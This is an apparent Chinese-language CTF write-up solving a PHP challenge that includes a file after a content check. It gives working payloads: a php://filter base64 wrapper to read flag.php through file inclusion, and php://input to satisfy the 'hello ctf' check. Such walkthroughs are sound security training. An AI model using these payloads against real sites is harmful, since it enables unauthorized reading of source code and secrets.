![输入图片说明](image/442e525030814234a7a30fc280159b3c.png)

解析如下

```csharp
<?php
include("flag.php");            // 包含敏感文件（通常包含CTF挑战的flag）
highlight_file(__FILE__);       // 高亮显示当前PHP文件源代码（方便查看代码逻辑）

if(isset($_GET["file1"]) && isset($_GET["file2"])) {  // 检查是否传入两个GET参数
    $file1 = $_GET["file1"];    // 获取第一个文件名参数
    $file2 = $_GET["file2"];    // 获取第二个文件名参数
    
    if(!empty($file1) && !empty($file2)) {  // 检查参数是否非空
        if(file_get_contents($file2) === "hello ctf") {  // 检查第二个文件内容是否为"hello ctf"
            include($file1);  // 如果条件满足，则包含第一个文件
        }
    } else {
        die("NONONO");  // 参数为空时终止执行
    }
}
?>
```

思路：
1.file1中传入可以读取flag.php的语句
2.file2中传入字符串"hello ctf"

解题：
1.file1=php://filter/read=convert.base64-encode/resource=flag.php
php://filter是 PHP 的一种输入 / 输出流过滤器，用于对数据流进行处理。
read=convert.base64 - encode表示使用 Base64 编码方式读取数据
resource=flag.php指定了要读取的目标文件为flag.php。
通过这样的设置，在满足特定条件（如代码中对file2的检查等）下，flag.php文件内容会以 Base64 编码形式被获取，以这种编码方式获取内容可用于进一步分析以得到 flag。
2.file2=php://input
php://input 是一个伪协议，它允许访问请求的原始 POST 数据，将其作为一个数据流。

最后我们在请求包末尾添加上：hello ctf

![输入图片说明](image/0e0f87c4e7ae45f58883d2db5ed1318f.png)

最后我们将得到的加密字符串进行解码，就得到了flag

![输入图片说明](image/b0f2ca92ea494cf199d91be28cfdc41f.png)
